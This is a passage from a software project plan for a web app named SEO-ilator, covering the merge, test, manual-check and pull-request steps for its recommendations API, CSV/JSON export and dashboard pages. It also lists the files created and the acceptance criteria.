API Agent first because it creates the recommendation routes and validation schemas that UI Agent's pages call. Export TDD Agent second because its serializers are imported by the API routes for CSV response formatting. UI Agent last because its components consume the API routes and display data formatted by the export modules.

### Step I.1 — Merge branches

- [ ] Merge all three branches into `feature/phase-6`

```bash
cd /Users/justin/CascadeProjects/SEO-ilator
git checkout develop
git checkout -b feature/phase-6
git merge feature/phase-6-api --no-ff -m "merge: API Agent (6.1, 6.3) into phase-6"
git merge feature/phase-6-export --no-ff -m "merge: Export TDD Agent (6.2) into phase-6"
git merge feature/phase-6-ui --no-ff -m "merge: UI Agent (6.4-6.8) into phase-6"
```

### Step I.2 — Automated verification

- [ ] Run all checks

| Check | Command | Expected |
|-------|---------|----------|
| Types pass | `npx tsc --noEmit` | Exit 0 |
| CSV tests pass | `npx vitest tests/lib/export/csv.test.ts --run` | 4/4 passing |
| Sanitize tests pass | `npx vitest tests/lib/export/sanitize.test.ts --run` | 4/4 passing |
| CopySnippet tests pass | `npx vitest tests/components/recommendations/CopySnippet.test.tsx --run` | 6/6 passing |
| RecommendationCard tests pass | `npx vitest tests/components/data/RecommendationCard.test.tsx --run` | 3/3 passing |
| All tests pass | `npx vitest --run` | All passing (including prior phases) |
| Build succeeds | `npm run build` | Exit 0 |

```bash
npx tsc --noEmit
npx vitest tests/lib/export/csv.test.ts --run
npx vitest tests/lib/export/sanitize.test.ts --run
npx vitest tests/components/recommendations/CopySnippet.test.tsx --run
npx vitest tests/components/data/RecommendationCard.test.tsx --run
npx vitest --run
npm run build
```

### Step I.3 — Manual verification checklist

- [ ] GET /api/recommendations supports JSON and CSV format params
- [ ] PATCH /api/recommendations/[id] uses optimistic locking [AAP-B12]
- [ ] Bulk PATCH with tenant isolation [AAP-B12]
- [ ] Zod validation schemas for update, bulk update, filter
- [ ] CsvSerializer streams with UTF-8 BOM
- [ ] sanitizeCell prefixes formula-injection characters
- [ ] JSON serializer adds Content-Disposition for download
- [ ] CopySnippet escapes HTML in anchor and URL [AAP-F3]
- [ ] CopySnippet clipboard fallback [AAP-F3]
- [ ] Article detail page with optimistic UI [AAP-F2]
- [ ] Analysis page with PreRunSummary [AAP-O8] and CancelButton [AAP-F4]
- [ ] Analysis progress with exponential backoff [AAP-F1]
- [ ] Runs history page with auto-updating running rows
- [ ] Export buttons on article detail and recommendations pages

### Step I.4 — PR to develop

- [ ] Create PR

```bash
gh pr create \
  --base develop \
  --head feature/phase-6 \
  --title "feat(phase-6): recommendations UI & export" \
  --body "## Summary
- Recommendations API routes (GET with JSON/CSV, PATCH with optimistic locking, bulk PATCH with tenant isolation)
- CSV serializer with UTF-8 BOM, streaming, and formula injection prevention
- JSON serializer with Content-Disposition download header
- CopySnippet component with HTML escaping and clipboard fallback
- RecommendationCard with severity badges and accept/dismiss actions
- Article detail page with optimistic UI and bulk actions
- Analysis page with pre-run summary, cancel, and exponential backoff polling
- Runs history page with auto-updating running rows
- Export buttons for CSV/JSON download

## AAP References
- [AAP-B12] Optimistic locking and tenant isolation
- [AAP-F1] Exponential backoff polling
- [AAP-F2] Optimistic UI with rollback
- [AAP-F3] HTML escaping and clipboard fallback
- [AAP-F4] Cancel analysis
- [AAP-O8] Pre-run dry run estimate

## Test Plan
- [ ] npx vitest tests/lib/export/csv.test.ts (4 tests)
- [ ] npx vitest tests/lib/export/sanitize.test.ts (4 tests)
- [ ] npx vitest tests/components/recommendations/CopySnippet.test.tsx (6 tests)
- [ ] npx vitest tests/components/data/RecommendationCard.test.tsx (3 tests)
- [ ] npx tsc --noEmit
- [ ] npm run build
- [ ] 17 total test cases passing"
```

---

## Test Summary

| Test File | Tests | Agent | TDD |
|-----------|-------|-------|-----|
| `tests/lib/export/csv.test.ts` | 4 | Export TDD | Yes (red/green) |
| `tests/lib/export/sanitize.test.ts` | 4 | Export TDD | Yes (red/green) |
| `tests/components/recommendations/CopySnippet.test.tsx` | 6 | UI | Yes (red/green) |
| `tests/components/data/RecommendationCard.test.tsx` | 3 | UI | Yes (red/green) |
| **Total** | **17** | | |

## Files Created

| File | Agent | Task |
|------|-------|------|
| `src/lib/validation/recommendationSchemas.ts` | API | 6.3 |
| `src/app/api/recommendations/route.ts` | API | 6.1 |
| `src/app/api/recommendations/[id]/route.ts` | API | 6.1 |
| `src/app/api/recommendations/bulk/route.ts` | API | 6.1 |
| `tests/lib/export/csv.test.ts` | Export TDD | 6.2 |
| `src/lib/export/csv.ts` | Export TDD | 6.2 |
| `tests/lib/export/sanitize.test.ts` | Export TDD | 6.2 |
| `src/lib/export/sanitize.ts` | Export TDD | 6.2 |
| `src/lib/export/json.ts` | Export TDD | 6.2 |
| `tests/components/recommendations/CopySnippet.test.tsx` | UI | 6.5 |
| `src/components/recommendations/CopySnippet.tsx` | UI | 6.5 |
| `tests/components/data/RecommendationCard.test.tsx` | UI | 6.4 |
| `src/components/data/RecommendationCard.tsx` | UI | 6.4 |
| `src/app/dashboard/articles/[id]/page.tsx` | UI | 6.4 |
| `src/app/dashboard/analyze/page.tsx` | UI | 6.6 |
| `src/app/dashboard/runs/page.tsx` | UI | 6.7 |
| `src/components/recommendations/ExportButtons.tsx` | UI | 6.8 |

## Acceptance Criteria

- [ ] Recommendations display with severity badges, anchor text, source context
- [ ] Accept/dismiss updates recommendation status
- [ ] Bulk accept/dismiss works for up to 500 items
- [ ] Severity and status filters work
- [ ] CopySnippet generates correct HTML and copies to clipboard
- [ ] CSV export downloads with correct columns, BOM, and formula sanitization
- [ ] JSON export downloads with Content-Disposition header
- [ ] Analysis page shows pre-run summary with embedding estimate
- [ ] Analysis progress polls and shows completion
- [ ] Runs history shows all past runs with status
- [ ] [AAP-F2] Optimistic UI rollback works on PATCH failure
- [ ] [AAP-F3] CopySnippet escapes special characters in anchor text and URL
- [ ] [AAP-F3] CopySnippet fallback works in non-HTTPS contexts
- [ ] [AAP-B12] Concurrent update on same recommendation returns 409
- [ ] [AAP-F4] Cancel button stops in-progress analysis
- [ ] [AAP-O8] Dry run shows estimate before starting analysis
